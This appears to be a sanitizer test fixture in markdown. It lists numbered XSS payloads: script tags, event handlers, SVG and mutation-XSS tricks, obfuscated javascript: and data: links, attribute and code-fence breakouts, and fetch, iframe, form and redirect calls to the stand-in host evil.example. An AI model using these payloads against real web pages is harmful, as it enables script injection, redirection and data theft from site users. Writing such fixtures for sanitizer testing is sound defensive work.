---
type: build
status: open
blocked_by: []
related: [02, 03]
---

# 01 — HTML and SVG <img src=x onerror=alert(1)>

<script>fetch('https://evil.example/script-block')</script>

Inline: <script>alert(1)</script> and <img src="https://evil.example/img.png" onerror="alert(2)"> and <svg onload="alert(3)"><circle r="5"/></svg>.

<img src=x onerror=alert(4)>

<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example/svg')"><script>alert(5)</script><a xlink:href="javascript:alert(6)"><text>x</text></a><image href="https://evil.example/svg-image.png"/><foreignObject><iframe src="https://evil.example/fo"></iframe></foreignObject></svg>

<iframe src="https://evil.example/iframe"></iframe>
<object data="https://evil.example/object"></object>
<embed src="https://evil.example/embed">
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
<base href="https://evil.example/">
<link rel="prefetch" href="https://evil.example/prefetch">
<link rel="stylesheet" href="https://evil.example/style.css">
<style>@import url("https://evil.example/import.css"); body { background: url(https://evil.example/bg.png) }</style>
<form action="https://evil.example/form"><input name="q" autofocus onfocus="alert(7)"><button formaction="https://evil.example/fa">go</button></form>
<video src="https://evil.example/v.mp4" poster="https://evil.example/poster.png"></video>
<audio src="https://evil.example/a.mp3" autoplay></audio>
<details open ontoggle="alert(8)"><summary>x</summary></details>
<marquee onstart="alert(9)">x</marquee>
<template><img src=x onerror=alert(10)></template>
<noscript><p title="</noscript><img src=x onerror=alert(11)>"></noscript>
<math><mtext><table><mglyph><style><img src=x onerror=alert(12)></style></mglyph></table></mtext></math>
<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(13)&gt;</style></svg>
<div style="position:fixed;inset:0;background:url(https://evil.example/overlay.png)">overlay</div>

## Anchors that carry more than an id

<a id="ok-anchor"></a>

<a id="x" onclick="alert(14)">click</a>

<a id="y" href="javascript:alert(15)">link</a>

<a id="z"><img src=x onerror=alert(16)></a>

<a id='q1" onmouseover="alert(17)'></a>

Text <br onclick=alert(18)> after a br with a handler, <br/> and <BR >.

<!-- a comment --><script>alert(19)</script>

<!--> <img src=x onerror=alert(20)> -->

<!-- --!><img src=x onerror=alert(21)> -->

## Markdown links with script schemes

[plain](javascript:alert(22)) · [case](JaVaScRiPt:alert(23)) · [tab](java	script:alert(24)) · [entity](&#x6A;avascript:alert(25)) · [entity2](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(26)) · [space]( javascript:alert(27)) · [newline](javascript&#10;:alert(28))

[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgyOSk8L3NjcmlwdD4=) · [vbs](vbscript:msgbox(30))

<javascript:alert(31)> · <data:text/html,<script>alert(32)</script>>

![img js](javascript:alert(33)) ![img data svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMzQpPjwvc3ZnPg==)

[ref link][evil] and ![ref image][evilimg]

[evil]: javascript:alert(35) "title"
[evilimg]: https://evil.example/ref.png

Title injection: [t](https://evil.example/ "a\" onmouseover=\"alert(36)") and ![alt" onerror="alert(37)](x.png)

```html" onmouseover="alert(38)
<script>alert(39)</script>
```

```typescript
const x = "</code></pre><img src=x onerror=alert(40)>"
```

| a <img src=x onerror=alert(41)> | b |
|:--|--:|
| <script>alert(42)</script> | `<b>` |

- [ ] task <img src=x onerror=alert(43)>
- [x] done

Entities: &lt;script&gt; &#60;img src=x onerror=alert(44)&#62; &amp;lt;
